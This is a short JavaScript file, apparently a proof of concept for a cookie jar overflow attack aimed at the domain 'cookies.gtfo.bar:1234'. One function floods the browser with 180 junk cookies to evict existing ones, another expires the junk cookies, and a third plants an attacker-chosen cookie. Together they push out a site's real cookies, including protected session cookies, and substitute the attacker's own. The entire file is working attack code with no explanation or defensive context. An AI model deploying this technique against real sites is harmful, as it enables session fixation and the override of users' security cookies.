var domainName = "cookies.gtfo.bar:1234";
var jarSize = 180;

function overflowCookieJar() {
    for (var i = 0; i < jarSize; i++) {
        var cookieName = "trash_" + i;
        var cookieValue = "trash_" + i;
        document.cookie = cookieName + "=" + cookieValue + "; domain=" + domainName;
    }

}

function clearCookieJar() {
    for (var i = 0; i < jarSize; i++) {
        var cookieName = "trash_" + i;
        var cookieValue = "trash_" + i;
        document.cookie = cookieName + "=" + cookieValue + ";expires=Thu, 01 Jan 1970 00:00:01 GMT; domain=" + domainName;
    }
}

function setCookie(cookie) {
    document.cookie = "my_cookie=" + cookie + "; domain=" + domainName;
}